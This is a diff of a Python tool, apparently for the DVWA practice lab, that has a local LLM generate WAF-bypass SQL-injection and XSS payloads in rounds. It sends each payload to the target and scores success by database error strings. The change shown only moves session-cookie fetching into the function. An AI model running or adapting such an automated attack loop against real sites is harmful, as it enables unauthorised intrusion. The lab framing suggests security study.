@@ -1,6 +1,6 @@
 # ═══════════════════════════════════════════════════════════════
 # bypass_loop.py — AI sinh payload bypass WAF theo vòng lặp
-# Đã cập nhật: Fix URL, kẹp Submit param và fix bug in log
+# Đã fix lỗi: Gọi cookie trong hàm thực thi thay vì global
 # ═══════════════════════════════════════════════════════════════
 
 import json
@@ -20,8 +20,6 @@ DEFAULT_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl
 SQLI_SUCCESS_MARKERS = ["syntax error", "sqlite", "sql", "ora-", "mysql", "odbc", "unclosed quotation", "near \"", "unrecognized token"]
 XSS_ENCODED_FORMS = ["&lt;", "&#60;", "\\u003c", "%3C", "%3c"]
 
-DVWA_COOKIES = get_dvwa_cookies()
-
 def _evaluate_success(body: str, vuln_type: str) -> bool:
     if vuln_type == "sqli":
         return any(m in body.lower() for m in SQLI_SUCCESS_MARKERS)
@@ -33,8 +31,8 @@ def _evaluate_success(body: str, vuln_type: str) -> bool:
         return True
     return False
 
-def _send_payload(finding: dict, payload: str) -> tuple[str, int]:
-    # Sử dụng TARGET_HOST
+def _send_payload(finding: dict, payload: str, cookies: dict) -> tuple[str, int]:
+    # Sử dụng TARGET_HOST (Trick chuỗi rỗng từ config sẽ an toàn)
     url    = f"{TARGET_HOST}{finding['url']}"
     method = finding.get("method", "GET")
     param  = finding["param"]
@@ -44,9 +42,9 @@ def _send_payload(finding: dict, payload: str) -> tuple[str, int]:
 
     try:
         if method == "GET":
-            r = httpx.get(url, params=request_data, headers=DEFAULT_HEADERS, cookies=DVWA_COOKIES, timeout=10, follow_redirects=True)
+            r = httpx.get(url, params=request_data, headers=DEFAULT_HEADERS, cookies=cookies, timeout=10, follow_redirects=True)
         else:
-            r = httpx.post(url, data=request_data, headers=DEFAULT_HEADERS, cookies=DVWA_COOKIES, timeout=10, follow_redirects=True)
+            r = httpx.post(url, data=request_data, headers=DEFAULT_HEADERS, cookies=cookies, timeout=10, follow_redirects=True)
         return r.text[:500], r.status_code
     except Exception as e:
         logging.warning(f"[bypass] HTTP lỗi: {e}")
@@ -70,6 +68,9 @@ def bypass_one(finding: dict) -> dict:
     url       = finding.get("url", "?")
     history   = []
     client    = ollama.Client(host=AI_SERVER)
+
+    # Lấy Session DVWA tại thời điểm hàm thực sự chạy
+    dvwa_cookies = get_dvwa_cookies()
 
     print(f"\n[Bypass] {vuln_type.upper()} @ {url} (Tối đa {BYPASS_MAX_ROUNDS} vòng)")
 
@@ -99,7 +100,7 @@ def bypass_one(finding: dict) -> dict:
             print(f"         Vòng {rnd}: Payload không hợp lệ — skip")
             continue
 
-        body, status = _send_payload(finding, payload)
+        body, status = _send_payload(finding, payload, dvwa_cookies)
         success = _evaluate_success(body, vuln_type)
 
         history.append({"round": rnd, "payload": payload, "technique": technique, "success": success, "status": status, "snippet": body[:120]})
@@ -123,12 +124,10 @@ def bypass_all(findings: list) -> list:
     print(f"\n[Bypass] {len(eligible)} eligible ({skipped} skipped vì confidence < 0.5)")
     results = []
     
-    # 1. Quét những mục tiêu đạt chuẩn
     for i, finding in enumerate(eligible, 1):
         print(f"\n[Bypass] Tiến trình: [{i}/{len(eligible)}]")
         results.append(bypass_one(finding))
 
-    # 2. Gộp lại những mục tiêu bị skip để không mất data
     for finding in findings:
         if finding.get("confidence", 0) < 0.5:
             finding["bypass_history"] = []
@@ -137,4 +136,4 @@ def bypass_all(findings: list) -> list:
 
     success_count = sum(1 for f in results if f.get("bypass_success"))
     print(f"\n[Bypass] ✅ {success_count}/{len(eligible)} bypass thành công")
-    return results
+    return results  
